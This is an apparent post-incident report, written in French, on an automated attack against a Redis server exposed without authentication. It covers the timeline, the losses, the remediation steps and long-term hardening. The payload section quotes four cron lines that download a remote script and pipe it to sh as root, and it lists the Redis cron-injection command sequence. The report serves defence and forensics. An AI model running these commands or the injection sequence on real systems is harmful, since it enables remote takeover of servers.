# 🚨 Incident sécurité Redis — 2026-04-27 02:03 UTC

> **Statut** : ATTAQUE DÉTECTÉE — payload non matérialisé, système recovered partiellement, **action sécurité requise au réveil**.
>
> **Forensics** : `data/forensics/redis_incident_20260427_020822.txt`

## TL;DR

Un attaquant externe a exécuté `FLUSHALL` sur Redis à 02:03 (Redis exposé `0.0.0.0:6379` sans auth ni protected-mode) et a tenté d'injecter un payload cron via 4 keys `backup1-4` pointant vers `https://accrochezvous.fr/plugins-dist/safehtml/images/cc.txt | sh`.

**Le payload n'a pas été matérialisé** (le binding `dir=/data` n'écrit pas dans `/etc/cron.d/`, et `/etc/cron.d/` du container Redis ne contient que `e2scrub_all` legitime). Les 4 keys `backup*` ont été nettoyées (DEL) après capture forensique.

**Pertes** : tous jobs RQ + état CF in-flight au moment du flushall. Les workers ont continué leur code Python in-memory mais leurs résultats RQ sont perdus. Le KG Neo4j et Qdrant + caches `data/extraction_cache/` sont **intacts**.

**Recovery** : le pipeline a redémarré naturellement (RQ recrée workers + jobs sur reconnexion). Au moment où tu lis ceci, ClaimFirst cs25_amdt_27 tourne sur worker-2.

## Timeline

| Heure (local) | Évènement |
|--------------|-----------|
| 21:03 | Workers démarrés (uptime 5h au moment de l'incident) |
| ~00:30 | Cycles d'ingestion nuit (3 docs persistés en KG) |
| **02:03** | **`FLUSHALL` depuis 172.18.0.1 (gateway docker → connexion externe)** |
| 02:03 | Tentative injection cron via SET backup1..backup4 |
| 02:05 | Détection : queue CF passée 5→0 sans completion + state CF vide (event monitor) |
| 02:08 | Capture forensique + DEL backup1..backup4 |
| 02:08 | RQ auto-recovery (workers re-enregistrés, jobs cs25_amdt_27 recréés) |

## Configuration vulnérable identifiée

```yaml
# docker-compose.infra.yml (Redis service)
ports:
  - "6379:6379"   # ← BINDING 0.0.0.0 SUR INTERNET, à corriger
```

```bash
$ docker exec knowbase-redis redis-cli CONFIG GET protected-mode
"no"   # ← protected-mode désactivé

$ docker exec knowbase-redis redis-cli CONFIG GET requirepass
""     # ← pas de mot de passe
```

**Combinaison létale** : port public + protected-mode désactivé + pas d'auth = attaque automatisée triviale (scan de port 6379 sur Internet).

## Payload de l'attaquant (capture)

```
backup1: */2 * * * * root cd1 -fsSL https://accrochezvous.fr/plugins-dist/safehtml/images/cc.txt | sh
backup2: */3 * * * * root wget -q -O- https://accrochezvous.fr/plugins-dist/safehtml/images/cc.txt | sh
backup3: */4 * * * * root curl -fsSL https://accrochezvous.fr/plugins-dist/safehtml/images/cc.txt | sh
backup4: */5 * * * * root wd1 -q -O- https://accrochezvous.fr/plugins-dist/safehtml/images/cc.txt | sh
```

> Note : `cd1` et `wd1` sont des typos (probablement `curl` et `wget`). 2 sur 4 commandes valides. Pattern classique de l'attaque "Redis cron" automatisée.

L'attaquant tente la séquence :
1. `CONFIG SET dir /etc/cron.d/`
2. `CONFIG SET dbfilename root`
3. `SET backup1 "..."` (× N)
4. `BGSAVE` → écrit `dump.rdb` cron-formatté dans `/etc/cron.d/root`

**Pourquoi ça a échoué ici** : impossible de vérifier directement, mais le `CONFIG GET dir` actuel montre `/data` → soit l'attaquant n'a pas fini la séquence, soit Redis a rejeté le SET dir vers `/etc/cron.d/` (permissions container).

## Pertes vérifiées

| Composant | État |
|-----------|------|
| Redis (jobs RQ, state CF) | **Tout flush** — 5 CF queue + état CF en cours perdus |
| Neo4j | **INTACT** — 6883 claims, 3 DocumentContext (dualuse_del_2023_996, cs25_amdt_23, dualuse_del_2024_2025) |
| Qdrant | À vérifier au réveil |
| `data/extraction_cache/` | **INTACT** — caches V2 + ClaimFirst sur disk |
| `data/docs_done/` | **INTACT** — 17 PDFs traités V2 |

**Docs orphelins** (V2 fini sans ClaimFirst persisté en KG) : 14 docs sur 17 (les 3 persistés sont déjà au KG). Liste à confirmer via `scripts/retrigger_orphan_claimfirst.py --dry-run`.

## Actions à exécuter au réveil

### 🔴 Priorité 1 — Sécurisation Redis

**Option A (recommandée) : binding interne uniquement**

Modifier `docker-compose.infra.yml` :
```yaml
redis:
  ports:
    - "127.0.0.1:6379:6379"   # ← localhost only
```
Puis : `./kw.ps1 restart` (ou restart Redis seul si possible).

**Option B (complémentaire) : auth + protected-mode**
```bash
docker exec knowbase-redis redis-cli CONFIG SET requirepass "<strong-password>"
docker exec knowbase-redis redis-cli CONFIG SET protected-mode yes
# Persister :
docker exec knowbase-redis redis-cli CONFIG REWRITE
# Mettre le password dans .env (REDIS_URL=redis://:<pass>@redis:6379/0)
# Restart workers/app pour pickup le password
```

**Action immédiate sans restart** (option de minimisation des dégâts) :
```bash
docker exec knowbase-redis redis-cli CONFIG SET protected-mode yes
```
→ Bloque les nouvelles connexions externes sans toucher aux clients déjà connectés.

### 🟡 Priorité 2 — Purger les caches Python compromis (par précaution)

Le payload n'a probablement pas été exécuté, MAIS par défense en profondeur :
- Vérifier `/etc/cron.d/` du **container Redis** (déjà OK : seul `e2scrub_all` legitime présent)
- Vérifier les autres containers (worker, app) pour des `/etc/cron.d/` injectés (peu probable car ils n'étaient pas la cible directe)
- Pas d'évidence d'écriture sur l'host filesystem

### 🟢 Priorité 3 — Reprise du pipeline

État au moment du rapport (02:08) :
- **docs_in** : vide
- **docs_done** : 17 PDFs
- **Worker-1** : V2 cs25_amdt_27 fini, en attente
- **Worker-2** : ClaimFirst cs25_amdt_27 en Phase 0.5 (UnitIndexer)
- **Queue ClaimFirst** : 0 (les 5 perdues au flushall)

Séquence de reprise :
1. Sécuriser Redis (Priorité 1)
2. Restart conteneurs (`./kw.ps1 restart`) pour pickup :
   - Sécurisation Redis
   - llm_models.yaml Qwen3-235B
   - Heartbeat ClaimFirst
   - V2 emit Redis cockpit
3. `python scripts/retrigger_orphan_claimfirst.py --dry-run` pour lister les docs orphelins
4. `python scripts/retrigger_orphan_claimfirst.py` pour les re-enqueuer
5. Attendre completion ClaimFirst (~6-8h pour 14 docs si 2 workers)
6. `python scripts/bench_qwen3_235b_knowledge_extraction.py --num-samples 15 --judge claude`
7. Compléter `doc/ongoing/BENCH_QWEN3_235B_KNOWLEDGE_EXTRACTION.md`
8. Pipeline post-import (build_perspectives, IDF, etc.)

## Forensics conservés

`data/forensics/redis_incident_20260427_020822.txt` contient :
- Port binding au moment de l'incident
- Config Redis complète (dir, dbfilename, save, requirepass, protected-mode)
- Liste de toutes les keys remaining
- Contenu intégral des 4 backup keys (avant DEL)
- Slowlog (commande `flushall` depuis 172.18.0.1:33296)
- Client list complète
- État dump.rdb + /etc/cron.d/

## Recommandations long terme

1. **Audit des autres services exposés** : Neo4j (7474/7687), Qdrant (6333), Postgres ? Vérifier `docker port <service>` pour chaque container.
2. **Mot de passe sur tous les services data** : Neo4j a déjà un password, Qdrant a aussi un mécanisme d'API key à activer.
3. **Réseau interne uniquement par défaut** : seuls Frontend (3000), API (8000), UI (8501), Grafana (3001) doivent être exposés publiquement.
4. **Monitoring sécurité** : alerter sur commandes Redis dangereuses (`FLUSHALL`, `CONFIG SET`, `DEBUG`) via slowlog ou MONITOR.
5. **Disable les commandes dangereuses** :
   ```
   rename-command FLUSHALL ""
   rename-command FLUSHDB ""
   rename-command CONFIG ""
   ```
   dans `redis.conf`.
